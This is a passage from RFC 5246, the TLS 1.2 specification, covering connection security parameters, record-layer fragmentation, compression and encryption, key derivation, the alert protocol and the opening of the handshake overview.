   either of the pending states current, in which case the appropriate
   current state is disposed of and replaced with the pending state; the
   pending state is then reinitialized to an empty state.  It is illegal
   to make a state that has not been initialized with security
   parameters a current state.  The initial current state always
   specifies that no encryption, compression, or MAC will be used.

   The security parameters for a TLS Connection read and write state are
   set by providing the following values:

   connection end
      Whether this entity is considered the "client" or the "server" in
      this connection.

   PRF algorithm
      An algorithm used to generate keys from the master secret (see
      Sections [5](#section-5) and [6.3](#section-6.3)).

Dierks & Rescorla           Standards Track                    [Page 16]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   bulk encryption algorithm
      An algorithm to be used for bulk encryption.  This specification
      includes the key size of this algorithm, whether it is a block,
      stream, or AEAD cipher, the block size of the cipher (if
      appropriate), and the lengths of explicit and implicit
      initialization vectors (or nonces).

   MAC algorithm
      An algorithm to be used for message authentication.  This
      specification includes the size of the value returned by the MAC
      algorithm.

   compression algorithm
      An algorithm to be used for data compression.  This specification
      must include all information the algorithm requires to do
      compression.

   master secret
      A 48-byte secret shared between the two peers in the connection.

   client random
      A 32-byte value provided by the client.

   server random
      A 32-byte value provided by the server.

      These parameters are defined in the presentation language as:

      enum { server, client } ConnectionEnd;

      enum { tls_prf_sha256 } PRFAlgorithm;

      enum { null, rc4, 3des, aes }
        BulkCipherAlgorithm;

      enum { stream, block, aead } CipherType;

      enum { null, hmac_md5, hmac_sha1, hmac_sha256,
           hmac_sha384, hmac_sha512} MACAlgorithm;

      enum { null(0), (255) } CompressionMethod;

      /* The algorithms specified in CompressionMethod, PRFAlgorithm,
         BulkCipherAlgorithm, and MACAlgorithm may be added to. */

Dierks & Rescorla           Standards Track                    [Page 17]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      struct {
          ConnectionEnd          entity;
          PRFAlgorithm           prf_algorithm;
          BulkCipherAlgorithm    bulk_cipher_algorithm;
          CipherType             cipher_type;
          uint8                  enc_key_length;
          uint8                  block_length;
          uint8                  fixed_iv_length;
          uint8                  record_iv_length;
          MACAlgorithm           mac_algorithm;
          uint8                  mac_length;
          uint8                  mac_key_length;
          CompressionMethod      compression_algorithm;
          opaque                 master_secret[48];
          opaque                 client_random[32];
          opaque                 server_random[32];
      } SecurityParameters;

   The record layer will use the security parameters to generate the
   following six items (some of which are not required by all ciphers,
   and are thus empty):

      client write MAC key
      server write MAC key
      client write encryption key
      server write encryption key
      client write IV
      server write IV

   The client write parameters are used by the server when receiving and
   processing records and vice versa.  The algorithm used for generating
   these items from the security parameters is described in [Section 6.3](#section-6.3).

   Once the security parameters have been set and the keys have been
   generated, the connection states can be instantiated by making them
   the current states.  These current states MUST be updated for each
   record processed.  Each connection state includes the following
   elements:

   compression state
      The current state of the compression algorithm.

   cipher state
      The current state of the encryption algorithm.  This will consist
      of the scheduled key for that connection.  For stream ciphers,
      this will also contain whatever state information is necessary to
      allow the stream to continue to encrypt or decrypt data.

Dierks & Rescorla           Standards Track                    [Page 18]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   MAC key
      The MAC key for this connection, as generated above.

   sequence number
      Each connection state contains a sequence number, which is
      maintained separately for read and write states.  The sequence
      number MUST be set to zero whenever a connection state is made the
      active state.  Sequence numbers are of type uint64 and may not
      exceed 2^64-1.  Sequence numbers do not wrap.  If a TLS
      implementation would need to wrap a sequence number, it must
      renegotiate instead.  A sequence number is incremented after each
      record: specifically, the first record transmitted under a
      particular connection state MUST use sequence number 0.

[6.2](#section-6.2).  Record Layer

   The TLS record layer receives uninterpreted data from higher layers
   in non-empty blocks of arbitrary size.

[6.2.1](#section-6.2.1).  Fragmentation

   The record layer fragments information blocks into TLSPlaintext
   records carrying data in chunks of 2^14 bytes or less.  Client
   message boundaries are not preserved in the record layer (i.e.,
   multiple client messages of the same ContentType MAY be coalesced
   into a single TLSPlaintext record, or a single message MAY be
   fragmented across several records).

      struct {
          uint8 major;
          uint8 minor;
      } ProtocolVersion;

      enum {
          change_cipher_spec(20), alert(21), handshake(22),
          application_data(23), (255)
      } ContentType;

      struct {
          ContentType type;
          ProtocolVersion version;
          uint16 length;
          opaque fragment[TLSPlaintext.length];
      } TLSPlaintext;

   type
      The higher-level protocol used to process the enclosed fragment.

Dierks & Rescorla           Standards Track                    [Page 19]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   version
      The version of the protocol being employed.  This document
      describes TLS Version 1.2, which uses the version { 3, 3 }.  The
      version value 3.3 is historical, deriving from the use of {3, 1}
      for TLS 1.0.  (See [Appendix A.1](#appendix-A.1).)  Note that a client that
      supports multiple versions of TLS may not know what version will
      be employed before it receives the ServerHello.  See [Appendix E](#appendix-E)
      for discussion about what record layer version number should be
      employed for ClientHello.

   length
      The length (in bytes) of the following TLSPlaintext.fragment.  The
      length MUST NOT exceed 2^14.

   fragment
      The application data.  This data is transparent and treated as an
      independent block to be dealt with by the higher-level protocol
      specified by the type field.

   Implementations MUST NOT send zero-length fragments of Handshake,
   Alert, or ChangeCipherSpec content types.  Zero-length fragments of
   Application data MAY be sent as they are potentially useful as a
   traffic analysis countermeasure.

   Note: Data of different TLS record layer content types MAY be
   interleaved.  Application data is generally of lower precedence for
   transmission than other content types.  However, records MUST be
   delivered to the network in the same order as they are protected by
   the record layer.  Recipients MUST receive and process interleaved
   application layer traffic during handshakes subsequent to the first
   one on a connection.

[6.2.2](#section-6.2.2).  Record Compression and Decompression

   All records are compressed using the compression algorithm defined in
   the current session state.  There is always an active compression
   algorithm; however, initially it is defined as
   CompressionMethod.null.  The compression algorithm translates a
   TLSPlaintext structure into a TLSCompressed structure.  Compression
   functions are initialized with default state information whenever a
   connection state is made active.  [[RFC3749](/doc/html/rfc3749)] describes compression
   algorithms for TLS.

   Compression must be lossless and may not increase the content length
   by more than 1024 bytes.  If the decompression function encounters a
   TLSCompressed.fragment that would decompress to a length in excess of
   2^14 bytes, it MUST report a fatal decompression failure error.

Dierks & Rescorla           Standards Track                    [Page 20]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      struct {
          ContentType type;       /* same as TLSPlaintext.type */
          ProtocolVersion version;/* same as TLSPlaintext.version */
          uint16 length;
          opaque fragment[TLSCompressed.length];
      } TLSCompressed;

   length
      The length (in bytes) of the following TLSCompressed.fragment.
      The length MUST NOT exceed 2^14 + 1024.

   fragment
      The compressed form of TLSPlaintext.fragment.

      Note: A CompressionMethod.null operation is an identity operation;
      no fields are altered.

      Implementation note: Decompression functions are responsible for
      ensuring that messages cannot cause internal buffer overflows.

[6.2.3](#section-6.2.3).  Record Payload Protection

      The encryption and MAC functions translate a TLSCompressed
      structure into a TLSCiphertext.  The decryption functions reverse
      the process.  The MAC of the record also includes a sequence
      number so that missing, extra, or repeated messages are
      detectable.

      struct {
          ContentType type;
          ProtocolVersion version;
          uint16 length;
          select (SecurityParameters.cipher_type) {
              case stream: GenericStreamCipher;
              case block:  GenericBlockCipher;
              case aead:   GenericAEADCipher;
          } fragment;
      } TLSCiphertext;

   type
      The type field is identical to TLSCompressed.type.

   version
      The version field is identical to TLSCompressed.version.

   length
      The length (in bytes) of the following TLSCiphertext.fragment.
      The length MUST NOT exceed 2^14 + 2048.

Dierks & Rescorla           Standards Track                    [Page 21]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   fragment
      The encrypted form of TLSCompressed.fragment, with the MAC.

[6.2.3.1](#section-6.2.3.1).  Null or Standard Stream Cipher

   Stream ciphers (including BulkCipherAlgorithm.null; see [Appendix A.6](#appendix-A.6))
   convert TLSCompressed.fragment structures to and from stream
   TLSCiphertext.fragment structures.

      stream-ciphered struct {
          opaque content[TLSCompressed.length];
          opaque MAC[SecurityParameters.mac_length];
      } GenericStreamCipher;

   The MAC is generated as:

      MAC(MAC_write_key, seq_num +
                            TLSCompressed.type +
                            TLSCompressed.version +
                            TLSCompressed.length +
                            TLSCompressed.fragment);

   where "+" denotes concatenation.

   seq_num
      The sequence number for this record.

   MAC
      The MAC algorithm specified by SecurityParameters.mac_algorithm.

   Note that the MAC is computed before encryption.  The stream cipher
   encrypts the entire block, including the MAC.  For stream ciphers
   that do not use a synchronization vector (such as RC4), the stream
   cipher state from the end of one record is simply used on the
   subsequent packet.  If the cipher suite is TLS_NULL_WITH_NULL_NULL,
   encryption consists of the identity operation (i.e., the data is not
   encrypted, and the MAC size is zero, implying that no MAC is used).
   For both null and stream ciphers, TLSCiphertext.length is
   TLSCompressed.length plus SecurityParameters.mac_length.

[6.2.3.2](#section-6.2.3.2).  CBC Block Cipher

   For block ciphers (such as 3DES or AES), the encryption and MAC
   functions convert TLSCompressed.fragment structures to and from block
   TLSCiphertext.fragment structures.

Dierks & Rescorla           Standards Track                    [Page 22]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      struct {
          opaque IV[SecurityParameters.record_iv_length];
          block-ciphered struct {
              opaque content[TLSCompressed.length];
              opaque MAC[SecurityParameters.mac_length];
              uint8 padding[GenericBlockCipher.padding_length];
              uint8 padding_length;
          };
      } GenericBlockCipher;

   The MAC is generated as described in [Section 6.2.3.1](#section-6.2.3.1).

   IV
      The Initialization Vector (IV) SHOULD be chosen at random, and
      MUST be unpredictable.  Note that in versions of TLS prior to 1.1,
      there was no IV field, and the last ciphertext block of the
      previous record (the "CBC residue") was used as the IV.  This was
      changed to prevent the attacks described in [[CBCATT](#ref-CBCATT)].  For block
      ciphers, the IV length is of length
      SecurityParameters.record_iv_length, which is equal to the
      SecurityParameters.block_size.

   padding
      Padding that is added to force the length of the plaintext to be
      an integral multiple of the block cipher's block length.  The
      padding MAY be any length up to 255 bytes, as long as it results
      in the TLSCiphertext.length being an integral multiple of the
      block length.  Lengths longer than necessary might be desirable to
      frustrate attacks on a protocol that are based on analysis of the
      lengths of exchanged messages.  Each uint8 in the padding data
      vector MUST be filled with the padding length value.  The receiver
      MUST check this padding and MUST use the bad_record_mac alert to
      indicate padding errors.

   padding_length
      The padding length MUST be such that the total size of the
      GenericBlockCipher structure is a multiple of the cipher's block
      length.  Legal values range from zero to 255, inclusive.  This
      length specifies the length of the padding field exclusive of the
      padding_length field itself.

   The encrypted data length (TLSCiphertext.length) is one more than the
   sum of SecurityParameters.block_length, TLSCompressed.length,
   SecurityParameters.mac_length, and padding_length.

   Example: If the block length is 8 bytes, the content length
   (TLSCompressed.length) is 61 bytes, and the MAC length is 20 bytes,
   then the length before padding is 82 bytes (this does not include the

Dierks & Rescorla           Standards Track                    [Page 23]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   IV.  Thus, the padding length modulo 8 must be equal to 6 in order to
   make the total length an even multiple of 8 bytes (the block length).
   The padding length can be 6, 14, 22, and so on, through 254.  If the
   padding length were the minimum necessary, 6, the padding would be 6
   bytes, each containing the value 6.  Thus, the last 8 octets of the
   GenericBlockCipher before block encryption would be xx 06 06 06 06 06
   06 06, where xx is the last octet of the MAC.

   Note: With block ciphers in CBC mode (Cipher Block Chaining), it is
   critical that the entire plaintext of the record be known before any
   ciphertext is transmitted.  Otherwise, it is possible for the
   attacker to mount the attack described in [[CBCATT](#ref-CBCATT)].

   Implementation note: Canvel et al. [[CBCTIME](#ref-CBCTIME)] have demonstrated a
   timing attack on CBC padding based on the time required to compute
   the MAC.  In order to defend against this attack, implementations
   MUST ensure that record processing time is essentially the same
   whether or not the padding is correct.  In general, the best way to
   do this is to compute the MAC even if the padding is incorrect, and
   only then reject the packet.  For instance, if the pad appears to be
   incorrect, the implementation might assume a zero-length pad and then
   compute the MAC.  This leaves a small timing channel, since MAC
   performance depends to some extent on the size of the data fragment,
   but it is not believed to be large enough to be exploitable, due to
   the large block size of existing MACs and the small size of the
   timing signal.

[6.2.3.3](#section-6.2.3.3).  AEAD Ciphers

   For AEAD [[AEAD](#ref-AEAD)] ciphers (such as [[CCM](#ref-CCM)] or [[GCM](#ref-GCM)]), the AEAD function
   converts TLSCompressed.fragment structures to and from AEAD
   TLSCiphertext.fragment structures.

      struct {
         opaque nonce_explicit[SecurityParameters.record_iv_length];
         aead-ciphered struct {
             opaque content[TLSCompressed.length];
         };
      } GenericAEADCipher;

   AEAD ciphers take as input a single key, a nonce, a plaintext, and
   "additional data" to be included in the authentication check, as
   described in Section 2.1 of [[AEAD](#ref-AEAD)].  The key is either the
   client_write_key or the server_write_key.  No MAC key is used.

   Each AEAD cipher suite MUST specify how the nonce supplied to the
   AEAD operation is constructed, and what is the length of the
   GenericAEADCipher.nonce_explicit part.  In many cases, it is

Dierks & Rescorla           Standards Track                    [Page 24]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   appropriate to use the partially implicit nonce technique described
   in Section 3.2.1 of [[AEAD](#ref-AEAD)]; with record_iv_length being the length of
   the explicit part.  In this case, the implicit part SHOULD be derived
   from key_block as client_write_iv and server_write_iv (as described
   in [Section 6.3](#section-6.3)), and the explicit part is included in
   GenericAEAEDCipher.nonce_explicit.

   The plaintext is the TLSCompressed.fragment.

   The additional authenticated data, which we denote as
   additional_data, is defined as follows:

      additional_data = seq_num + TLSCompressed.type +
                        TLSCompressed.version + TLSCompressed.length;

   where "+" denotes concatenation.

   The aead_output consists of the ciphertext output by the AEAD
   encryption operation.  The length will generally be larger than
   TLSCompressed.length, but by an amount that varies with the AEAD
   cipher.  Since the ciphers might incorporate padding, the amount of
   overhead could vary with different TLSCompressed.length values.  Each
   AEAD cipher MUST NOT produce an expansion of greater than 1024 bytes.
   Symbolically,

      AEADEncrypted = AEAD-Encrypt(write_key, nonce, plaintext,
                                   additional_data)

   In order to decrypt and verify, the cipher takes as input the key,
   nonce, the "additional_data", and the AEADEncrypted value.  The
   output is either the plaintext or an error indicating that the
   decryption failed.  There is no separate integrity check.  That is:

      TLSCompressed.fragment = AEAD-Decrypt(write_key, nonce,
                                            AEADEncrypted,
                                            additional_data)

   If the decryption fails, a fatal bad_record_mac alert MUST be
   generated.

[6.3](#section-6.3).  Key Calculation

   The Record Protocol requires an algorithm to generate keys required
   by the current connection state (see [Appendix A.6](#appendix-A.6)) from the security
   parameters provided by the handshake protocol.

Dierks & Rescorla           Standards Track                    [Page 25]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   The master secret is expanded into a sequence of secure bytes, which
   is then split to a client write MAC key, a server write MAC key, a
   client write encryption key, and a server write encryption key.  Each
   of these is generated from the byte sequence in that order.  Unused
   values are empty.  Some AEAD ciphers may additionally require a
   client write IV and a server write IV (see [Section 6.2.3.3](#section-6.2.3.3)).

   When keys and MAC keys are generated, the master secret is used as an
   entropy source.

   To generate the key material, compute

      key_block = PRF(SecurityParameters.master_secret,
                      "key expansion",
                      SecurityParameters.server_random +
                      SecurityParameters.client_random);

   until enough output has been generated.  Then, the key_block is
   partitioned as follows:

      client_write_MAC_key[SecurityParameters.mac_key_length]
      server_write_MAC_key[SecurityParameters.mac_key_length]
      client_write_key[SecurityParameters.enc_key_length]
      server_write_key[SecurityParameters.enc_key_length]
      client_write_IV[SecurityParameters.fixed_iv_length]
      server_write_IV[SecurityParameters.fixed_iv_length]

   Currently, the client_write_IV and server_write_IV are only generated
   for implicit nonce techniques as described in Section 3.2.1 of
   [[AEAD](#ref-AEAD)].

   Implementation note: The currently defined cipher suite which
   requires the most material is AES_256_CBC_SHA256.  It requires 2 x 32
   byte keys and 2 x 32 byte MAC keys, for a total 128 bytes of key
   material.

[7](#section-7).  The TLS Handshaking Protocols

   TLS has three subprotocols that are used to allow peers to agree upon
   security parameters for the record layer, to authenticate themselves,
   to instantiate negotiated security parameters, and to report error
   conditions to each other.

   The Handshake Protocol is responsible for negotiating a session,
   which consists of the following items:

Dierks & Rescorla           Standards Track                    [Page 26]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   session identifier
      An arbitrary byte sequence chosen by the server to identify an
      active or resumable session state.

   peer certificate
      X509v3 [[PKIX](#ref-PKIX)] certificate of the peer.  This element of the state
      may be null.

   compression method
      The algorithm used to compress data prior to encryption.

   cipher spec
      Specifies the pseudorandom function (PRF) used to generate keying
      material, the bulk data encryption algorithm (such as null, AES,
      etc.) and the MAC algorithm (such as HMAC-SHA1).  It also defines
      cryptographic attributes such as the mac_length.  (See [Appendix](#appendix-A.6)
      [A.6](#appendix-A.6) for formal definition.)

   master secret
      48-byte secret shared between the client and server.

   is resumable
      A flag indicating whether the session can be used to initiate new
      connections.

   These items are then used to create security parameters for use by
   the record layer when protecting application data.  Many connections
   can be instantiated using the same session through the resumption
   feature of the TLS Handshake Protocol.

[7.1](#section-7.1).  Change Cipher Spec Protocol

   The change cipher spec protocol exists to signal transitions in
   ciphering strategies.  The protocol consists of a single message,
   which is encrypted and compressed under the current (not the pending)
   connection state.  The message consists of a single byte of value 1.

      struct {
          enum { change_cipher_spec(1), (255) } type;
      } ChangeCipherSpec;

   The ChangeCipherSpec message is sent by both the client and the
   server to notify the receiving party that subsequent records will be
   protected under the newly negotiated CipherSpec and keys.  Reception
   of this message causes the receiver to instruct the record layer to
   immediately copy the read pending state into the read current state.
   Immediately after sending this message, the sender MUST instruct the
   record layer to make the write pending state the write active state.

Dierks & Rescorla           Standards Track                    [Page 27]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   (See [Section 6.1](#section-6.1).)  The ChangeCipherSpec message is sent during the
   handshake after the security parameters have been agreed upon, but
   before the verifying Finished message is sent.

   Note: If a rehandshake occurs while data is flowing on a connection,
   the communicating parties may continue to send data using the old
   CipherSpec.  However, once the ChangeCipherSpec has been sent, the
   new CipherSpec MUST be used.  The first side to send the
   ChangeCipherSpec does not know that the other side has finished
   computing the new keying material (e.g., if it has to perform a
   time-consuming public key operation).  Thus, a small window of time,
   during which the recipient must buffer the data, MAY exist.  In
   practice, with modern machines this interval is likely to be fairly
   short.

[7.2](#section-7.2).  Alert Protocol

   One of the content types supported by the TLS record layer is the
   alert type.  Alert messages convey the severity of the message
   (warning or fatal) and a description of the alert.  Alert messages
   with a level of fatal result in the immediate termination of the
   connection.  In this case, other connections corresponding to the
   session may continue, but the session identifier MUST be invalidated,
   preventing the failed session from being used to establish new
   connections.  Like other messages, alert messages are encrypted and
   compressed, as specified by the current connection state.

      enum { warning(1), fatal(2), (255) } AlertLevel;

      enum {
          close_notify(0),
          unexpected_message(10),
          bad_record_mac(20),
          decryption_failed_RESERVED(21),
          record_overflow(22),
          decompression_failure(30),
          handshake_failure(40),
          no_certificate_RESERVED(41),
          bad_certificate(42),
          unsupported_certificate(43),
          certificate_revoked(44),
          certificate_expired(45),
          certificate_unknown(46),
          illegal_parameter(47),
          unknown_ca(48),
          access_denied(49),
          decode_error(50),
          decrypt_error(51),

Dierks & Rescorla           Standards Track                    [Page 28]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

          export_restriction_RESERVED(60),
          protocol_version(70),
          insufficient_security(71),
          internal_error(80),
          user_canceled(90),
          no_renegotiation(100),
          unsupported_extension(110),
          (255)
      } AlertDescription;

      struct {
          AlertLevel level;
          AlertDescription description;
      } Alert;

[7.2.1](#section-7.2.1).  Closure Alerts

   The client and the server must share knowledge that the connection is
   ending in order to avoid a truncation attack.  Either party may
   initiate the exchange of closing messages.

   close_notify
      This message notifies the recipient that the sender will not send
      any more messages on this connection.  Note that as of TLS 1.1,
      failure to properly close a connection no longer requires that a
      session not be resumed.  This is a change from TLS 1.0 to conform
      with widespread implementation practice.

   Either party may initiate a close by sending a close_notify alert.
   Any data received after a closure alert is ignored.

   Unless some other fatal alert has been transmitted, each party is
   required to send a close_notify alert before closing the write side
   of the connection.  The other party MUST respond with a close_notify
   alert of its own and close down the connection immediately,
   discarding any pending writes.  It is not required for the initiator
   of the close to wait for the responding close_notify alert before
   closing the read side of the connection.

   If the application protocol using TLS provides that any data may be
   carried over the underlying transport after the TLS connection is
   closed, the TLS implementation must receive the responding
   close_notify alert before indicating to the application layer that
   the TLS connection has ended.  If the application protocol will not
   transfer any additional data, but will only close the underlying
   transport connection, then the implementation MAY choose to close the
   transport without waiting for the responding close_notify.  No part

Dierks & Rescorla           Standards Track                    [Page 29]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   of this standard should be taken to dictate the manner in which a
   usage profile for TLS manages its data transport, including when
   connections are opened or closed.

   Note: It is assumed that closing a connection reliably delivers
   pending data before destroying the transport.

[7.2.2](#section-7.2.2).  Error Alerts

   Error handling in the TLS Handshake protocol is very simple.  When an
   error is detected, the detecting party sends a message to the other
   party.  Upon transmission or receipt of a fatal alert message, both
   parties immediately close the connection.  Servers and clients MUST
   forget any session-identifiers, keys, and secrets associated with a
   failed connection.  Thus, any connection terminated with a fatal
   alert MUST NOT be resumed.

   Whenever an implementation encounters a condition which is defined as
   a fatal alert, it MUST send the appropriate alert prior to closing
   the connection.  For all errors where an alert level is not
   explicitly specified, the sending party MAY determine at its
   discretion whether to treat this as a fatal error or not.  If the
   implementation chooses to send an alert but intends to close the
   connection immediately afterwards, it MUST send that alert at the
   fatal alert level.

   If an alert with a level of warning is sent and received, generally
   the connection can continue normally.  If the receiving party decides
   not to proceed with the connection (e.g., after having received a
   no_renegotiation alert that it is not willing to accept), it SHOULD
   send a fatal alert to terminate the connection.  Given this, the
   sending party cannot, in general, know how the receiving party will
   behave.  Therefore, warning alerts are not very useful when the
   sending party wants to continue the connection, and thus are
   sometimes omitted.  For example, if a peer decides to accept an
   expired certificate (perhaps after confirming this with the user) and
   wants to continue the connection, it would not generally send a
   certificate_expired alert.

   The following error alerts are defined:

   unexpected_message
      An inappropriate message was received.  This alert is always fatal
      and should never be observed in communication between proper
      implementations.

Dierks & Rescorla           Standards Track                    [Page 30]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   bad_record_mac
      This alert is returned if a record is received with an incorrect
      MAC.  This alert also MUST be returned if an alert is sent because
      a TLSCiphertext decrypted in an invalid way: either it wasn't an
      even multiple of the block length, or its padding values, when
      checked, weren't correct.  This message is always fatal and should
      never be observed in communication between proper implementations
      (except when messages were corrupted in the network).

   decryption_failed_RESERVED
      This alert was used in some earlier versions of TLS, and may have
      permitted certain attacks against the CBC mode [[CBCATT](#ref-CBCATT)].  It MUST
      NOT be sent by compliant implementations.

   record_overflow
      A TLSCiphertext record was received that had a length more than
      2^14+2048 bytes, or a record decrypted to a TLSCompressed record
      with more than 2^14+1024 bytes.  This message is always fatal and
      should never be observed in communication between proper
      implementations (except when messages were corrupted in the
      network).

   decompression_failure
      The decompression function received improper input (e.g., data
      that would expand to excessive length).  This message is always
      fatal and should never be observed in communication between proper
      implementations.

   handshake_failure
      Reception of a handshake_failure alert message indicates that the
      sender was unable to negotiate an acceptable set of security
      parameters given the options available.  This is a fatal error.

   no_certificate_RESERVED
      This alert was used in SSLv3 but not any version of TLS.  It MUST
      NOT be sent by compliant implementations.

   bad_certificate
      A certificate was corrupt, contained signatures that did not
      verify correctly, etc.

   unsupported_certificate
      A certificate was of an unsupported type.

   certificate_revoked
      A certificate was revoked by its signer.

Dierks & Rescorla           Standards Track                    [Page 31]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   certificate_expired
      A certificate has expired or is not currently valid.

   certificate_unknown
      Some other (unspecified) issue arose in processing the
      certificate, rendering it unacceptable.

   illegal_parameter
      A field in the handshake was out of range or inconsistent with
      other fields.  This message is always fatal.

   unknown_ca
      A valid certificate chain or partial chain was received, but the
      certificate was not accepted because the CA certificate could not
      be located or couldn't be matched with a known, trusted CA.  This
      message is always fatal.

   access_denied
      A valid certificate was received, but when access control was
      applied, the sender decided not to proceed with negotiation.  This
      message is always fatal.

   decode_error
      A message could not be decoded because some field was out of the
      specified range or the length of the message was incorrect.  This
      message is always fatal and should never be observed in
      communication between proper implementations (except when messages
      were corrupted in the network).

   decrypt_error
      A handshake cryptographic operation failed, including being unable
      to correctly verify a signature or validate a Finished message.
      This message is always fatal.

   export_restriction_RESERVED
      This alert was used in some earlier versions of TLS.  It MUST NOT
      be sent by compliant implementations.

   protocol_version
      The protocol version the client has attempted to negotiate is
      recognized but not supported.  (For example, old protocol versions
      might be avoided for security reasons.)  This message is always
      fatal.

Dierks & Rescorla           Standards Track                    [Page 32]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   insufficient_security
      Returned instead of handshake_failure when a negotiation has
      failed specifically because the server requires ciphers more
      secure than those supported by the client.  This message is always
      fatal.

   internal_error
      An internal error unrelated to the peer or the correctness of the
      protocol (such as a memory allocation failure) makes it impossible
      to continue.  This message is always fatal.

   user_canceled
      This handshake is being canceled for some reason unrelated to a
      protocol failure.  If the user cancels an operation after the
      handshake is complete, just closing the connection by sending a
      close_notify is more appropriate.  This alert should be followed
      by a close_notify.  This message is generally a warning.

   no_renegotiation
      Sent by the client in response to a hello request or by the server
      in response to a client hello after initial handshaking.  Either
      of these would normally lead to renegotiation; when that is not
      appropriate, the recipient should respond with this alert.  At
      that point, the original requester can decide whether to proceed
      with the connection.  One case where this would be appropriate is
      where a server has spawned a process to satisfy a request; the
      process might receive security parameters (key length,
      authentication, etc.) at startup, and it might be difficult to
      communicate changes to these parameters after that point.  This
      message is always a warning.

   unsupported_extension
      sent by clients that receive an extended server hello containing
      an extension that they did not put in the corresponding client
      hello.  This message is always fatal.

   New Alert values are assigned by IANA as described in [Section 12](#section-12).

[7.3](#section-7.3).  Handshake Protocol Overview

   The cryptographic parameters of the session state are produced by the
   TLS Handshake Protocol, which operates on top of the TLS record
   layer.  When a TLS client and server first start communicating, they
   agree on a protocol version, select cryptographic algorithms,
   optionally authenticate each other, and use public-key encryption
   techniques to generate shared secrets.

Dierks & Rescorla           Standards Track                    [Page 33]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   The TLS Handshake Protocol involves the following steps:

   -  Exchange hello messages to agree on algorithms, exchange random
      values, and check for session resumption.

   -  Exchange the necessary cryptographic parameters to allow the
      client and server to agree on a premaster secret.

   -  Exchange certificates and cryptographic information to allow the
      client and server to authenticate themselves.

   -  Generate a master secret from the premaster secret and exchanged
      random values.

   -  Provide security parameters to the record layer.

   -  Allow the client and server to verify that their peer has
      calculated the same security parameters and that the handshake
      occurred without tampering by an attacker.

   Note that higher layers should not be overly reliant on whether TLS
   always negotiates the strongest possible connection between two
   peers.  There are a number of ways in which a man-in-the-middle
   attacker can attempt to make two entities drop down to the least
   secure method they support.  The protocol has been designed to
   minimize this risk, but there are still attacks available: for
   example, an attacker could block access to the port a secure service
   runs on, or attempt to get the peers to negotiate an unauthenticated
   connection.  The fundamental rule is that higher levels must be
   cognizant of what their security requirements are and never transmit
   information over a channel less secure than what they require.  The
   TLS protocol is secure in that any cipher suite offers its promised
   level of security: if you negotiate 3DES with a 1024-bit RSA key
   exchange with a host whose certificate you have verified, you can
   expect to be that secure.

   These goals are achieved by the handshake protocol, which can be
   summarized as follows: The client sends a ClientHello message to
   which the server must respond with a ServerHello message, or else a
   fatal error will occur and the connection will fail.  The ClientHello
   and ServerHello are used to establish security enhancement
   capabilities between client and server.  The ClientHello and
   ServerHello establish the following attributes: Protocol Version,
   Session ID, Cipher Suite, and Compression Method.  Additionally, two
   random values are generated and exchanged: ClientHello.random and
   ServerHello.random.

Dierks & Rescorla           Standards Track                    [Page 34]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   The actual key exchange uses up to four messages: the server
   Certificate, the ServerKeyExchange, the client Certificate, and the
   ClientKeyExchange.  New key exchange methods can be created by
   specifying a format for these messages and by defining the use of the
   messages to allow the client and server to agree upon a shared
   secret.  This secret MUST be quite long; currently defined key
   exchange methods exchange secrets that range from 46 bytes upwards.

   Following the hello messages, the server will send its certificate in
   a Certificate message if it is to be authenticated.  Additionally, a
   ServerKeyExchange message may be sent, if it is required (e.g., if
   the server has no certificate, or if its certificate is for signing
   only).  If the server is authenticated, it may request a certificate
   from the client, if that is appropriate to the cipher suite selected.
   Next, the server will send the ServerHelloDone message, indicating
   that the hello-message phase of the handshake is complete.  The
   server will then wait for a client response.  If the server has sent
   a CertificateRequest message, the client MUST send the Certificate
   message.  The ClientKeyExchange message is now sent, and the content
   of that message will depend on the public key algorithm selected
   between the ClientHello and the ServerHello.  If the client has sent
   a certificate with signing ability, a digitally-signed
   CertificateVerify message is sent to explicitly verify possession of
   the private key in the certificate.

   At this point, a ChangeCipherSpec message is sent by the client, and
   the client copies the pending Cipher Spec into the current Cipher
   Spec.  The client then immediately sends the Finished message under
   the new algorithms, keys, and secrets.  In response, the server will
   send its own ChangeCipherSpec message, transfer the pending to the
   current Cipher Spec, and send its Finished message under the new
   Cipher Spec.  At this point, the handshake is complete, and the
   client and server may begin to exchange application layer data.  (See
   flow chart below.)  Application data MUST NOT be sent prior to the
   completion of the first handshake (before a cipher suite other than
   TLS_NULL_WITH_NULL_NULL is established).

Dierks & Rescorla           Standards Track                    [Page 35]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      Client                                               Server

      ClientHello                  -------->
                                                      ServerHello
                                                     Certificate*
                                               ServerKeyExchange*
                                              CertificateRequest*
                                   <--------      ServerHelloDone
      Certificate*
      ClientKeyExchange
      CertificateVerify*
      [ChangeCipherSpec]
      Finished                     -------->
                                               [ChangeCipherSpec]
                                   <--------             Finished
      Application Data             <------->     Application Data

             Figure 1.  Message flow for a full handshake

   * Indicates optional or situation-dependent messages that are not
   always sent.

   Note: To help avoid pipeline stalls, ChangeCipherSpec is an
   independent TLS protocol content type, and is not actually a TLS
   handshake message.

   When the client and server decide to resume a previous session or
   duplicate an existing session (instead of negotiating new security
   parameters), the message flow is as follows:

   The client sends a ClientHello using the Session ID of the session to
